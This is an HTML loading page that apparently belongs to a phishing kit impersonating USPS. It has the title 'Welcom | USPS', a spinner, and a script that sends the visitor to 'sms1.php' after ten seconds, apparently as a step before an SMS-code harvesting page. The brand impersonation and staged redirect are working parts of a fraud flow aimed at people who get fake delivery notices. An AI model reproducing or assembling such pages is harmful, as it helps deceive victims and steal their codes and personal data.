<!DOCTYPE html>
<!-- saved from url=(0045)/look/loading_1.php -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	    
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet" href="./../files/4_files/bootstrap-icons.css">
        <link rel="stylesheet" href="./../files/4_files/font-awesome.min.css"> 
        <title>Welcom | USPS</title>
        <!-- logo site web-->
        <link rel="icon" href="/look/photos/khikhi.ico" type="image/x-icon">
        <link rel="shortcut icon" href="/look/photos/khikhi.ico" type="image/x-icon">
        <!-- link__css -->
        <link rel="stylesheet" href="./../files/4_files/bootstrap.css">
        <link rel="stylesheet" href="./../files/4_files/laylay.css">
</head>
<body>
       
 

        <div class="loading">
            <div class="d-flex justify-content-center">
                <div class="spinner-border" role="status">
                     <span class="sr-only"></span>
                </div>
            </div>
        </div>

     


      <script src="./../files/4_files/jquery-3.5.1.min.js.téléchargement"></script>
      <script src="./../files/4_files/bootstrap.min.js.téléchargement"></script>
      <script>
           
             setTimeout(function () {
                window.location.href= 'sms1.php';
            },10000);
             
      </script>

<div id="torrent-scanner-popup" style="display: none;"></div></body></html>